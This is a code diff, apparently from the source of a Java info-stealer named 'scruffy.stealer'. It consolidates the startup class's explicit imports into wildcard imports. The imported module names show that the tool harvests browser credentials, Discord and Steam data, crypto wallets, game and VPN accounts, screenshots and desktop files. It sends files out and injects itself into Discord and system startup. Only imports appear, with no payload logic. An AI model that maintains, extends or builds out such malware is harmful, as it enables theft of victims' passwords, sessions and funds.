@@ -4,31 +4,15 @@ import java.net.ServerSocket;
 import java.util.Arrays;
 import java.util.concurrent.TimeUnit;
 
-import scruffy.stealer.file.file_delete;
-import scruffy.stealer.file.file_move;
-import scruffy.stealer.file.file_send;
-import scruffy.stealer.impl.app.discord;
-import scruffy.stealer.impl.app.steam;
-import scruffy.stealer.impl.browser.brave;
-import scruffy.stealer.impl.browser.chrome;
-import scruffy.stealer.impl.browser.edge;
-import scruffy.stealer.impl.browser.firefox;
-import scruffy.stealer.impl.browser.opera;
-import scruffy.stealer.impl.browser.operagx;
-import scruffy.stealer.impl.browser.vivaldi;
-import scruffy.stealer.impl.browser.yandex;
-import scruffy.stealer.impl.coin.wallet;
-import scruffy.stealer.impl.game.craftrise;
-import scruffy.stealer.impl.game.growtopia;
-import scruffy.stealer.impl.game.minecraft;
-import scruffy.stealer.impl.game.sonoyuncu;
-import scruffy.stealer.impl.inject.discord_injector;
-import scruffy.stealer.impl.inject.startup_injector;
-import scruffy.stealer.impl.system.desktop;
-import scruffy.stealer.impl.system.screenshot;
-import scruffy.stealer.impl.vpn.nord_vpn;
-import scruffy.stealer.impl.vpn.open_vpn;
-import scruffy.stealer.impl.vpn.proton_vpn;
+import scruffy.stealer.file.*;
+import scruffy.stealer.impl.app.*;
+import scruffy.stealer.impl.browser.*;
+import scruffy.stealer.impl.coin.*;
+import scruffy.stealer.impl.game.*;
+import scruffy.stealer.impl.inject.*;
+import scruffy.stealer.impl.system.*;
+import scruffy.stealer.impl.vpn.*;
+
 import scruffy.stealer.utils.utilities;
 
 public class startup {
